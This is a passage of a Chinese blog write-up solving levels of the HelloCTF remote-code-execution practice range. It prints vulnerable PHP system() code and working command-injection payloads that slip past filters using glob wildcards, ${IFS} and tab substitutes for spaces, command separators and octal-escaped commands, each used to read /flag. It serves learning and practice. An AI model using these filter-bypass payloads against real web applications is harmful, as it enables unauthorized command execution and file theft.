+<col style="width: 15%" />
+<col style="width: 43%" />
+</colgroup>
+<thead>
+<tr>
+<th>通配符</th>
+<th>功能说明</th>
+<th>示例</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>*</code></td>
+<td>匹配零个或多个字符</td>
+<td><code>*.txt</code></td>
+<td>匹配所有以 <code>.txt</code> 结尾的文件</td>
+</tr>
+<tr>
+<td><code>?</code></td>
+<td>匹配单个字符</td>
+<td><code>file?.txt</code></td>
+<td>匹配 <code>file1.txt</code>、<code>file2.txt</code>
+等单个字符的文件名</td>
+</tr>
+<tr>
+<td><code>[ ]</code></td>
+<td>匹配方括号内的任意一个字符</td>
+<td><code>file[1-3].txt</code></td>
+<td>匹配
+<code>file1.txt</code>、<code>file2.txt</code>、<code>file3.txt</code></td>
+</tr>
+<tr>
+<td><code>[^ ]</code></td>
+<td>匹配不在方括号内的字符</td>
+<td><code>file[^a-c].txt</code></td>
+<td>匹配不包含 a 到 c 之间字符的文件</td>
+</tr>
+<tr>
+<td><code>&#123; &#125;</code></td>
+<td>匹配大括号内的任意一个字符，使用逗号分隔</td>
+<td><code>file&#123;1,2,3&#125;.txt</code></td>
+<td>匹配
+<code>file1.txt</code>、<code>file2.txt</code>、<code>file3.txt</code></td>
+</tr>
+<tr>
+<td><code>~</code></td>
+<td>表示当前用户的主目录</td>
+<td><code>~/Documents</code></td>
+<td>访问主目录下的 <code>Documents</code> 文件夹</td>
+</tr>
+<tr>
+<td><code>!</code></td>
+<td>表示取反，在某些条件测试或模式匹配中使用</td>
+<td><code>ls !( *.txt )</code></td>
+<td>列出所有不是 <code>.txt</code> 结尾的文件</td>
+</tr>
+<tr>
+<td><code>\</code></td>
+<td>转义字符，取消通配符的特殊意义</td>
+<td><code>file\*.txt</code></td>
+<td>匹配文件名为 <code>file*.txt</code> 的文件</td>
+</tr>
+</tbody>
+</table>
+<h2 id="解决">解决</h2>
+<p>观察此处的正则过滤了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;, $cmd)</span><br></pre></td></tr></table></figure>
+<p>所以能用的只有一个字母 a 和数字</p>
+<p>而此时我们通过了解通配符，可以发现用?可以逐渐匹配各个字符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?cmd=/???/?a? /??a? </span><br><span class="line"><span class="comment">#这个命令会匹配到/bin/cat /flag，接着找flag就好了</span></span><br></pre></td></tr></table></figure>
+<p>或者说</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=/???/?a??<span class="number">64</span> /??a?</span><br><span class="line">    <span class="comment">//匹配到/bin/base64 /flag，将/flag进行base64编码后输出</span></span><br></pre></td></tr></table></figure>
+<h1 id="rce靶场第七题">RCE靶场第七题</h1>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag| /&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>过滤了flag和空格，所以只需要绕过空格和flag即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat$&#123;IFS&#125;/fl<span class="string">&quot;&quot;</span>ag<span class="comment">#空格被视为一个命令分隔符，本质上由 $IFS 变量控制，直接键入 $IFS 来绕过空格过滤。</span></span><br><span class="line">?cmd=cat<span class="variable">$IFS</span>/fl<span class="string">&quot;&quot;</span>ag</span><br><span class="line">?cmd=cat%<span class="number">09</span>/fl<span class="string">&quot;&quot;</span>ag<span class="comment">#空格的url绕过</span></span><br></pre></td></tr></table></figure>
+<h2 id="rce靶场第八题">RCE靶场第八题</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - RCE靶场 : 命令执行 - 重定向 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">大多数 UNIX 系统命令从你的终端接受输入并将所产生的输出发送回​​到您的终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端 —— 这些是命令有回显的基础。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">如果希望执行某个命令，但又不希望在屏幕上显示输出结果，那么可以将输出重定向到 /dev/null：</span></span><br><span class="line"><span class="comment">$ command &gt; /dev/null</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">/dev/null 是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到。但是 /dev/null 文件非常有用，将命令的输出重定向到它，会起到&quot;禁止输出&quot;的效果。</span></span><br><span class="line"><span class="comment">如果希望屏蔽 stdout 和 stderr，可以这样写：</span></span><br><span class="line"><span class="comment">$ command &gt; /dev/null 2&gt;&amp;1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">/*&gt;/dev/null 将不会有任何回显，但会回显错误，加上 2&gt;&amp;1 后连错误也会被屏蔽掉*/</span></span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>.<span class="string">&quot;&gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>关键函数在于</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>.<span class="string">&quot;&gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>这行代码将执行命令 $cmd，并且将其标准输出和标准错误输出都重定向到
+/dev/null，这意味着无论命令的输出还是可能产生的错误信息都不会显示出来</p>
+<p>所以我们直接用命令分隔符分开就行了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?cmd=cat /flag; </span><br></pre></td></tr></table></figure>
+<p>这个payload会先打印 <code>/flag</code>
+文件内容，然后再执行其标准输出和标准错误输出都重定向到
+/dev/null，但是flag会先输出出来所以重定向不影响打印结果。</p>
+<h2 id="第九题">第九题</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--- HelloCTF - RCE靶场 : 命令执行 - bash终端的无字母命令执行_八进制转义 ---</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">题目已经拥有成熟脚本：https://github.com/ProbiusOfficial/bashFuck</span></span><br><span class="line"><span class="comment">你也可以使用在线生成：https://probiusofficial.github.io/bashFuck/</span></span><br><span class="line"><span class="comment">题目本身也提供一个/exp.php方便你使用</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">从该关卡开始你会发现我们在Dockerfile中添加了一行改动：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">RUN ln -sf /bin/bash /bin/sh</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">这是由于在PHP中，system是执行sh的，sh通常只是一个软连接，并不是真的有一个shell叫sh。在debian系操作系统中，sh指向dash；在centos系操作系统中，sh指向bash，我们用的底层镜像 php:7.3-fpm-alpine 默认指向的 /bin/busybox ，要验证这一点，你可以对 /bin/sh 使用 ls -l 命令查看，在这个容器中，你会得到下面的回显：</span></span><br><span class="line"><span class="comment">bash-5.1# ls -l /bin/sh</span></span><br><span class="line"><span class="comment">lrwxrwxrwx    1 root     root            12 Mar 16  2022 /bin/sh -&gt; /bin/busybox</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">我们需要用到的特性只有bash才支持，请记住这一点，这也是我们手动修改指向的原因。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">在这个关卡主要利用的是在终端中，$&#x27;\xxx&#x27;可以将八进制ascii码解析为字符，仅基于这个特性，我们可以将传入的命令的每一个字符转换为$&#x27;\xxx\xxx\xxx\xxx&#x27;的形式，但是注意，这种方式在没有空格的情况下无法执行带参数的命令。</span></span><br><span class="line"><span class="comment">比如&quot;ls -l&quot;也就是$&#x27;\154\163\40\55\154&#x27; 只能拆分为$&#x27;\154\163&#x27; 空格 $&#x27;\55\154&#x27;三部分。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">bash-5.1# $&#x27;\154\163\40\55\154&#x27;</span></span><br><span class="line"><span class="comment">bash: ls -l: command not found</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">bash-5.1# $&#x27;\154\163&#x27; $&#x27;\55\154&#x27;</span></span><br><span class="line"><span class="comment">total 4</span></span><br><span class="line"><span class="comment">-rw-r--r--    1 www-data www-data       829 Aug 14 19:39 index.php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z\&quot;%*+,-.\/:;=&gt;?@[\]^`|]/&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>本题中禁用了字母和符号，只有数字可以用</p>
+<p>上边赛题提示，已经将 /bin/sh 设置为指向 /bin/bash
+的符号链接。换句话说，运行 /bin/sh 时，实际上会调用 /bin/bash</p>
+<p>接下来就是bash的8进制绕过</p>
+<p>为了方便做题，特地提示我们：</p>
+<ol type="1">
+<li>即使是八进制，同样需要空格</li>
+<li>提供了一个BashFuck工具在exp.php中</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?cmd=$<span class="string">&#x27;\143\141\164&#x27;</span> $<span class="string">&#x27;\57\146\154\141\147&#x27;</span></span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#rce%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">RCE靶场第一题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">RCE靶场第二题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%89%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">RCE靶场第三题</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#get_fun%E5%87%BD%E6%95%B0%E4%B8%AD"><span class="toc-number">3.0.0.0.1.</span> <span class="toc-text">get_fun()函数中</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#start%E5%87%BD%E6%95%B0%E4%B8%AD"><span class="toc-number">3.0.0.0.2.</span> <span class="toc-text">start()函数中</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#func_list%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="toc-number">3.0.0.0.3.</span> <span class="toc-text">$func_list[]中的函数分析</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">RCE靶场第四题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%94%E9%A2%98"><span class="toc-number">5.</span> <span class="toc-text">RCE靶场第五题</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%9A%84%E6%98%AFshell%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">5.0.0.0.1.</span> <span class="toc-text">考察的是shell的基本运算符</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#rce%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%85%AD%E9%A2%98"><span class="toc-number"></span> <span class="toc-text">RCE靶场第六题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E5%8F%8A%E5%85%B6%E7%94%A8%E6%B3%95"><span class="toc-number"></span> <span class="toc-text">通配符及其用法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3"><span class="toc-number">1.</span> <span class="toc-text">解决</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#rce%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%83%E9%A2%98"><span class="toc-number"></span> <span class="toc-text">RCE靶场第七题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#rce%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%85%AB%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">RCE靶场第八题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">第九题</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/&text=RCE靶场学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/&title=RCE靶场学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/&is_video=false&description=RCE靶场学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RCE靶场学习&body=Check out this article: http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/&title=RCE靶场学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/&title=RCE靶场学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/&title=RCE靶场学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/&title=RCE靶场学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/&name=RCE靶场学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/&t=RCE靶场学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+	  <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+    </nav>
+  </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
